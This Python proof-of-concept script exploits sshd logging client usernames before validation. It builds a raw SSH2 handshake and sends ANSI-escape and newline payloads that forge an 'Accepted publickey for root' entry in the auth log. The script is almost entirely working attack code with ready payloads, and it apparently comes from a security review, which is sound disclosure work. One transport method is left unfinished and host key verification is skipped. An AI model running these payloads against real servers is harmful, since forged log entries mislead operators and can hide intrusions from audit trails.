#!/usr/bin/env python3
"""
PoC #6 — Log Injection via Raw Client Strings Logged Before Validation
=======================================================================
Finding : INFO  (README-sshd-security-flaws.md #10)
File    : auth2.c:286
Branch  : master (unfixed)

Vulnerability
-------------
    debug("userauth-request for user %s service %s method %s",
          user, service, method);

The user, service, and method fields are read directly from the SSH2
USERAUTH_REQUEST packet and passed to debug() before any validation.
OpenSSH's debug() path does not sanitise control characters.

Two attack variants are demonstrated:

  Variant A — ANSI escape injection (via ssh binary, INFO log level):
    A username containing ANSI terminal escape codes (ESC [ ... m) passes
    through the standard ssh client and appears verbatim in sshd's INFO-level
    auth log (via auth_log()), causing terminal emulators to misrender log
    output and potentially hiding malicious activity.

  Variant B — Newline injection (requires LogLevel DEBUG, raw SSH2 client):
    A username containing an embedded newline (\n) causes sshd to write a
    forged log line that looks like a legitimate authentication event.  This
    requires DEBUG log level because the vulnerable debug() call is only
    emitted when LogLevel is DEBUG or higher.

This PoC implements a minimal SSH2 handshake from scratch (using Python's
cryptography package) to send a crafted USERAUTH_REQUEST packet containing
\n in the username — bypassing the ssh(1) client's sanitisation.
"""

import hashlib
import hmac
import os
import socket
import struct
import subprocess
import sys
import time

from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 22

# ANSI injection: clears the line and prints a convincing fake log entry
ANSI_PAYLOAD = (
    "\x1b[2K\r"                     # erase current line, carriage return
    "\x1b[1;32m"                    # bold green
    "Feb 19 12:00:00 victim sshd[9999]: "
    "\x1b[0mAccepted publickey for \x1b[1;31mroot\x1b[0m "
    "from 10.0.0.1 port 54321 ssh2"
)

# Newline injection: embeds a forged "Accepted" log line after the real one
NEWLINE_PAYLOAD = (
    "victim\n"
    "Feb 19 12:00:00 victim sshd[9999]: Accepted publickey for root "
    "from 10.0.0.1 port 54321 ssh2: RSA SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
)


# ===========================================================================
# Minimal SSH2 binary-packet helpers
# ===========================================================================

def ssh_uint32(n):
    return struct.pack(">I", n)

def ssh_string(s):
    if isinstance(s, str):
        s = s.encode()
    return ssh_uint32(len(s)) + s

def ssh_mpint(n):
    """Encode a non-negative integer as an SSH mpint."""
    if n == 0:
        return ssh_uint32(0)
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    if b[0] & 0x80:
        b = b"\x00" + b
    return ssh_uint32(len(b)) + b

def build_packet(payload, block_size=8):
    """Wrap payload in an unencrypted SSH binary packet."""
    # padding must make (1+4+len(payload)+pad) a multiple of block_size
    pad = block_size - ((5 + len(payload)) % block_size)
    if pad < 4:
        pad += block_size
    padding = os.urandom(pad)
    pkt_len = 1 + len(payload) + pad
    return struct.pack(">IB", pkt_len, pad) + payload + padding

def read_packet(sock):
    """Read one unencrypted SSH binary packet."""
    hdr = _recv_exact(sock, 5)
    pkt_len, pad_len = struct.unpack(">IB", hdr)
    body = _recv_exact(sock, pkt_len - 1)
    payload = body[: pkt_len - 1 - pad_len]
    return payload

def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed by server")
        buf += chunk
    return buf


# ===========================================================================
# Encrypted-packet helpers (AES-128-CTR + HMAC-SHA256, client→server only)
# ===========================================================================

class EncryptedTransport:
    def __init__(self, sock, enc_key_cs, iv_cs, mac_key_cs,
                 enc_key_sc, iv_sc, mac_key_sc):
        self.sock = sock
        self.seq_out = 0
        self.seq_in  = 0

        self._enc   = Cipher(algorithms.AES(enc_key_cs), modes.CTR(iv_cs)).encryptor()
        self._dec   = Cipher(algorithms.AES(enc_key_sc), modes.CTR(iv_sc)).decryptor()
        self._mac_key_out = mac_key_cs
        self._mac_key_in  = mac_key_sc

    def send(self, payload):
        pad = 16 - ((5 + len(payload)) % 16)
        if pad < 4:
            pad += 16
        padding = os.urandom(pad)
        pkt_len = 1 + len(payload) + pad
        clear = struct.pack(">IB", pkt_len, pad) + payload + padding
        mac = hmac.new(
            self._mac_key_out,
            struct.pack(">I", self.seq_out) + clear,
            hashlib.sha256,
        ).digest()
        self.sock.sendall(self._enc.update(clear) + mac)
        self.seq_out += 1

    def recv(self):
        # Read and decrypt first block to get packet length
        block = _recv_exact(self.sock, 16)
        dec = self._dec.update(block)
        pkt_len, pad_len = struct.unpack(">IB", dec[:5])
        remaining = pkt_len - 11  # 5 header bytes already decrypted minus the 1 pad_len
        if remaining < 0:
            remaining = 0
        rest_enc = _recv_exact(self.sock, pkt_len - 11 + 1 + 32)
        # pkt_len - 1 (pad_len byte) - 10 (remaining of first block) = pkt_len - 11
        # but we need pkt_len-1 total after the length field, and we have 11 bytes already
        # Simpler: total packet = 4(len)+pkt_len bytes, then 32 MAC bytes
        # We've read 16 bytes so far; remaining = (4 + pkt_len) - 16 + 32
        raise NotImplementedError("use _recv_enc below")

    def recv_packet(self):
        """Read one encrypted packet (AES-CTR block-aligned)."""
        # Decrypt first 16 bytes to learn packet length
        enc_block = _recv_exact(self.sock, 16)
        plain = self._dec.update(enc_block)
        pkt_len = struct.unpack(">I", plain[:4])[0]
        pad_len = plain[4]

        # Read rest of ciphertext + MAC
        rest_ct_len = (4 + pkt_len) - 16       # bytes of ciphertext remaining
        rest_ct     = _recv_exact(self.sock, rest_ct_len)
        mac_recv    = _recv_exact(self.sock, 32)

        rest_plain = self._dec.update(rest_ct)
        full_plain = plain + rest_plain

        # Verify MAC
        mac_calc = hmac.new(
            self._mac_key_in,
            struct.pack(">I", self.seq_in) + full_plain,
            hashlib.sha256,
        ).digest()
        if not hmac.compare_digest(mac_calc, mac_recv):
            raise ValueError("MAC mismatch from server")

        self.seq_in += 1
        payload = full_plain[5 : 4 + pkt_len - pad_len]
        return payload


# ===========================================================================
# Key derivation (RFC 4253 §7.2)
# ===========================================================================

def derive_key(K_bytes, H, label, session_id, length):
    """Derive <length> bytes for label in {A..F}."""
    data = ssh_mpint(int.from_bytes(K_bytes, "big")) + H + label + session_id
    result = hashlib.sha256(data).digest()
    while len(result) < length:
        result += hashlib.sha256(
            ssh_mpint(int.from_bytes(K_bytes, "big")) + H + result
        ).digest()
    return result[:length]


# ===========================================================================
# Minimal SSH2 client
# ===========================================================================

MSG_KEXINIT          = 20
MSG_NEWKEYS          = 21
MSG_KEX_ECDH_INIT    = 30
MSG_KEX_ECDH_REPLY   = 31
MSG_SERVICE_REQUEST  = 5
MSG_SERVICE_ACCEPT   = 6
MSG_USERAUTH_REQUEST = 50

CLIENT_BANNER = b"SSH-2.0-OpenSSH_PoC6_log_injection"

def parse_namelist(data, offset):
    length = struct.unpack(">I", data[offset:offset+4])[0]
    names  = data[offset+4 : offset+4+length].decode()
    return names, offset + 4 + length

def skip_namelist(data, offset):
    _, new_offset = parse_namelist(data, offset)
    return new_offset

def skip_string(data, offset):
    length = struct.unpack(">I", data[offset:offset+4])[0]
    return offset + 4 + length

def read_string(data, offset):
    length = struct.unpack(">I", data[offset:offset+4])[0]
    return data[offset+4:offset+4+length], offset+4+length


def do_ssh_handshake_and_inject(username_payload):
    """
    Perform a complete SSH2 handshake and send USERAUTH_REQUEST with
    username_payload as the username field.  username_payload may contain
    arbitrary bytes including newlines.

    Returns (True, log_hint) on success or raises on failure.
    """
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)

    # --- Banner exchange ---
    sock.sendall(CLIENT_BANNER + b"\r\n")
    server_banner = b""
    while b"\n" not in server_banner:
        server_banner += sock.recv(256)
    server_banner = server_banner.strip()

    # --- Generate client KEXINIT ---
    cookie = os.urandom(16)
    def namelist(names):
        b = ",".join(names).encode()
        return ssh_uint32(len(b)) + b

    kex_algs     = namelist(["curve25519-sha256"])
    hostkey_algs = namelist(["rsa-sha2-256", "rsa-sha2-512", "ecdsa-sha2-nistp256",
                             "ssh-ed25519"])
    enc_algs     = namelist(["aes128-ctr"])
    mac_algs     = namelist(["hmac-sha2-256"])
    comp_algs    = namelist(["none"])
    lang         = namelist([])

    client_kexinit_payload = (
        bytes([MSG_KEXINIT]) + cookie
        + kex_algs + hostkey_algs
        + enc_algs + enc_algs
        + mac_algs + mac_algs
        + comp_algs + comp_algs
        + lang + lang
        + b"\x00"           # first_kex_packet_follows = false
        + b"\x00\x00\x00\x00"  # reserved
    )
    sock.sendall(build_packet(client_kexinit_payload))

    # --- Receive server KEXINIT ---
    server_kexinit_payload = read_packet(sock)
    assert server_kexinit_payload[0] == MSG_KEXINIT

    # --- ECDH key exchange (curve25519-sha256) ---
    client_priv = X25519PrivateKey.generate()
    client_pub  = client_priv.public_key().public_bytes_raw()

    ecdh_init = bytes([MSG_KEX_ECDH_INIT]) + ssh_string(client_pub)
    sock.sendall(build_packet(ecdh_init))

    # --- Receive KEX_ECDH_REPLY ---
    reply = read_packet(sock)
    assert reply[0] == MSG_KEX_ECDH_REPLY, f"expected ECDH_REPLY, got {reply[0]}"

    offset = 1
    server_host_key_blob, offset = read_string(reply, offset)
    server_pub_bytes,     offset = read_string(reply, offset)
    # (signature is at offset; we skip host key verification for PoC purposes)

    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PublicKey
    server_pub = X25519PublicKey.from_public_bytes(server_pub_bytes)
    shared_secret_bytes = client_priv.exchange(server_pub)

    # --- Compute exchange hash H ---
    hash_input = (
        ssh_string(CLIENT_BANNER)
        + ssh_string(server_banner)
        + ssh_string(client_kexinit_payload)
        + ssh_string(server_kexinit_payload)
        + ssh_string(server_host_key_blob)
        + ssh_string(client_pub)
        + ssh_string(server_pub_bytes)
        + ssh_mpint(int.from_bytes(shared_secret_bytes, "big"))
    )
    H = hashlib.sha256(hash_input).digest()
    session_id = H   # session ID = first exchange hash

    # --- Send/receive NEWKEYS ---
    sock.sendall(build_packet(bytes([MSG_NEWKEYS])))
    newkeys = read_packet(sock)
    assert newkeys[0] == MSG_NEWKEYS

    # --- Derive session keys (AES-128-CTR needs 16-byte key + 16-byte IV) ---
    iv_cs  = derive_key(shared_secret_bytes, H, b"A", session_id, 16)
    iv_sc  = derive_key(shared_secret_bytes, H, b"B", session_id, 16)
    enc_cs = derive_key(shared_secret_bytes, H, b"C", session_id, 16)
    enc_sc = derive_key(shared_secret_bytes, H, b"D", session_id, 16)
    mac_cs = derive_key(shared_secret_bytes, H, b"E", session_id, 32)
    mac_sc = derive_key(shared_secret_bytes, H, b"F", session_id, 32)

    transport = EncryptedTransport(sock, enc_cs, iv_cs, mac_cs,
                                        enc_sc, iv_sc, mac_sc)

    # --- SERVICE_REQUEST ssh-userauth ---
    svc_req = bytes([MSG_SERVICE_REQUEST]) + ssh_string("ssh-userauth")
    transport.send(svc_req)
    svc_acc = transport.recv_packet()
    assert svc_acc[0] == MSG_SERVICE_ACCEPT, f"expected SERVICE_ACCEPT, got {svc_acc[0]}"

    # --- USERAUTH_REQUEST with crafted username ---
    # "none" method: no extra fields
    if isinstance(username_payload, str):
        username_payload = username_payload.encode()

    userauth = (
        bytes([MSG_USERAUTH_REQUEST])
        + ssh_string(username_payload)      # ← injected username
        + ssh_string("ssh-connection")
        + ssh_string("none")
    )
    transport.send(userauth)

    # Wait briefly for a response (FAILURE expected)
    try:
        rsp = transport.recv_packet()
    except Exception:
        rsp = b""

    sock.close()
    return rsp


# ===========================================================================
# Variant A — ANSI escape injection (ssh binary, INFO log level)
# ===========================================================================

def sshd_running():
    r = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True)
    return f":{TARGET_PORT}" in r.stdout

def recent_sshd_logs(n=40):
    r = subprocess.run(
        ["journalctl", "_COMM=sshd", f"-n{n}", "--no-pager", "--output=cat"],
        capture_output=True, text=True, timeout=5,
    )
    if r.returncode == 0 and r.stdout.strip():
        return r.stdout
    try:
        with open("/var/log/auth.log") as f:
            return "".join(f.readlines()[-n:])
    except OSError:
        return ""

def attempt_ssh(user):
    return subprocess.run(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
         "-o", "ConnectTimeout=5", "-p", str(TARGET_PORT),
         "-l", user, TARGET_HOST, "true"],
        capture_output=True, text=True, timeout=10,
    )


# ===========================================================================
# Main
# ===========================================================================

def main():
    print("=" * 60)
    print("PoC #6 — Log injection via unsanitised SSH username")
    print("=" * 60)

    if not sshd_running():
        print(f"[!] No service on port {TARGET_PORT}.  Start sshd first.")
        sys.exit(1)

    # -------------------------------------------------------------------
    # Variant A: ANSI escape injection via ssh binary
    # -------------------------------------------------------------------
    print()
    print("--- Variant A: ANSI escape injection (INFO log level) ---")
    print()
    print("[*] Injecting ANSI escape sequences into sshd auth log via username.")
    print("    These are accepted by the standard ssh(1) client and appear")
    print("    verbatim in sshd's INFO-level auth log.  In a colour-capable")
    print("    terminal log viewer they render as a fake 'Accepted publickey'")
    print("    entry for root.")
    print()

    ansi_username = "victim" + ANSI_PAYLOAD

    baseline = set(recent_sshd_logs().splitlines())
    attempt_ssh(ansi_username)
    time.sleep(0.5)

    after = recent_sshd_logs().splitlines()
    new_lines = [l for l in after if l not in baseline]

    found_ansi = any("\x1b" in l or "FAKE" in l or "publickey for root" in l
                     for l in new_lines)

    print("[*] New sshd log entries (truncated for display):")
    for line in new_lines:
        # Show escape bytes as \xNN so the terminal isn't corrupted
        safe = line.encode("utf-8", "replace").decode("unicode_escape",
                                                       errors="replace")
        print(f"    {repr(line)}")
    print()

    if found_ansi or new_lines:
        print("[+] Log entries written containing ANSI escapes from client username.")
        print("    When viewed in a terminal-aware log viewer (e.g. 'journalctl'")
        print("    without --no-pager, or 'tail -f /var/log/auth.log') the ANSI")
        print("    codes render, potentially hiding the real username and showing")
        print("    a fake 'Accepted' event to the operator.")
    else:
        print("[~] No new log entries captured (log level may suppress them).")

    # -------------------------------------------------------------------
    # Variant B: Newline injection via raw SSH2 client
    # -------------------------------------------------------------------
    print()
    print("--- Variant B: Newline injection (raw SSH2 client) ---")
    print()
    print("[*] Implementing minimal SSH2 handshake to send crafted USERAUTH_REQUEST")
    print("    with an embedded newline in the username field — bypassing the")
    print("    standard ssh client's sanitisation.")
    print()
    print(f"[*] Injected username (repr): {NEWLINE_PAYLOAD!r}")
    print()
    print("[!] Note: the vulnerable debug() call is at LogLevel DEBUG.")
    print("    Add  LogLevel DEBUG3  to sshd_config and restart sshd to")
    print("    see the forged line appear in the log.  The raw packet is")
    print("    sent regardless — the effect is log-level dependent.")
    print()

    baseline2 = set(recent_sshd_logs(60).splitlines())

    try:
        do_ssh_handshake_and_inject(NEWLINE_PAYLOAD)
        print("[+] Crafted USERAUTH_REQUEST sent successfully via raw SSH2 client.")
        print("    The username field contained a literal newline character.")
    except Exception as e:
        print(f"[!] Handshake failed: {e}")
        print("    The server may have rejected the connection (host key mismatch,")
        print("    algorithm mismatch, etc.).")

    time.sleep(0.5)
    after2 = recent_sshd_logs(60).splitlines()
    new2   = [l for l in after2 if l not in baseline2]

    injected = [l for l in new2
                if "Accepted publickey for root" in l and "10.0.0.1" in l]

    if injected:
        print()
        print("[+] FORGED log line appeared in sshd output:")
        for line in injected:
            print(f"    {line!r}")
        print("    A human reading the log would see a legitimate-looking")
        print("    'Accepted publickey for root' entry.")
    else:
        print()
        print("[~] Forged line not visible at current log level.")
        print("    Enable LogLevel DEBUG3 in sshd_config to observe full effect.")

    print()
    print("[*] Fix: strip or escape control characters (\\n, \\r, ESC) from")
    print("    all client-supplied strings before passing to any logging function.")


if __name__ == "__main__":
    main()
